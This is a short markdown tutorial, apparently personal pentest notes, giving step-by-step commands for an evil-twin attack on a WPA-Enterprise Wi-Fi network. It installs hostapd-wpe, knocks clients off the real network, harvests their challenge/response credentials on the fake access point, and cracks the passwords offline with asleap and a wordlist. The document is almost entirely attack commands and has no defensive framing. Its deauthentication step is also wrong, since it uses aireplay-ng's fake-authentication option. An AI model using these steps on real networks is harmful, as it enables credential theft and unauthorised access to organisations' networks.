- - -
## Overview : 
- We are going to Deauthenticate All users from the Enterprise Network.
- And Create a Fake Network ( AP ), similar to The Enterprise's one.

- - -
# Attack Steps : 

#### Installation : 
```sh
sudo apt-get update
sudo apt-get install hostapd-wpe 
```

#### Modify the configuration : 
```sh
subl /etc/hostapd-wpe/hostapd-wpe.conf
#interface=wlan0
#ssid=<Target-ESSID/Name>
```

Save and Quit.

#### Lets Attack : 

```sh
service network-manager stop
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

![Imgur](https://i.imgur.com/pP7WZoV.png)

#### Do a Fakeauth : 

```sh
aireplay-ng  --fakeauth 30 -a <Target-MAC> -h <Our-MAC> mon0
```

Now, we have Deauthenticated all the Clients.
- The Clients will now try to authenticate again manually.
- And we will catch the credentials.
- But as this tool behaves and works as a real WPA server, so the **creds are encrypted**.

![Imgur](https://i.imgur.com/DAzayMs.png)

- **Challenge** : A challenge send by Radius Server to Client.
- **Responce** : Encrypted The Challenge with the Client's Password is responce.
- **Jtr NETNTLM** : is the Encryped **Password** hash.

#### Cracking The Keys : 

```sh
asleap -C <Challenge-Value> -R <Responce-Value> -W Pass-Wordlist.txt 
```

![Imgur](https://i.imgur.com/dmli82I.png)

- - -




